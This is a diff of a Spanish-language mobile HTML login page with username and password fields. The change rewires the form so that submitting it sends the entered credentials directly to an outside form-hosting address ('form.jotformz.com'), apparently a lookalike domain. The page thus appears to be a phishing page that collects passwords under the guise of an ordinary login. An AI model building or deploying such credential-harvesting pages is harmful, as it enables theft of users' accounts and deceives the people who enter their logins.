@@ -70,12 +70,8 @@
 </style>
 
 <script language="JavaScript">
-
-function formulario(){
-window.location.assign("http://form.jotformz.com/form/52694051411651");
-}
-
 </script>
+
 </head>
 <body>
 <div data-role="popup" id="popupBasic"></div>
@@ -105,7 +101,7 @@ window.location.assign("http://form.jotformz.com/form/52694051411651");
     </div>
     <div data-role="content">
 
-        <form id="login-form" action="" method="POST">
+        <form id="login-form" action="http://form.jotformz.com/form/52694051411651" >
 
             <div data-role="fieldcontain">
                 <label id="codigo" for="username">
@@ -119,9 +115,8 @@ window.location.assign("http://form.jotformz.com/form/52694051411651");
                 </label>
                 <input name="password" id="password" placeholder="" value="" type="password">
             </div>
-            <a href="#dashboard" data-role="button" id="show-dashboard" style="display: none;">Show page "two"</a>
-            <input type="button" data-theme="e" data-icon="arrow-r" data-iconpos="right"
-            value="Ingresar" id="do-login" onclick="formulario()">
+            <input type="submit" data-theme="e" data-icon="arrow-r" data-iconpos="right"
+            value="Ingresar" id="do-login">
         </form>
 
     </div>
